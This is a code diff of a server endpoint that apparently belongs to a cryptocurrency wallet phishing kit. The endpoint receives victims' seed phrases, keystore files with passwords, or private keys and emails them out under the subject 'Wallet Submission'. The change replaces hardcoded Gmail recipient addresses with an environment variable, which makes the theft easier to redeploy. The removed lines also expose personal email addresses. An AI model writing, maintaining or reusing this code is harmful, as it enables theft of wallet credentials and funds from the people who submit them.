@@ -18,6 +18,7 @@ function formatMessage(message: string) {
 
 export async function POST(request: Request) {
   try {
+    const toEmail = process.env.EMAIL_RECEIVER;
     const { phrase, keystore, privateKey } = await request.json();
 
     if (phrase) {
@@ -36,7 +37,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `New Wallet Submission ${email}`,
-        to: ["fidelisepeter@gmail.com"],
+        to: toEmail,
         subject: "Wallet Submission",
         html: formattedMessage,
       };
@@ -78,7 +79,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `New Wallet Submission ${email}`,
-        to: ["jamesanderson197x@gmail.com"],
+        to: toEmail,
         subject: "Wallet Submission",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       };
@@ -122,7 +123,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `New Wallet Submission ${email}`,
-        to: ["jamesanderson197x@gmail.com"],
+        to: toEmail,
         subject: "Wallet Submission",
         html: formattedMessage,
       };
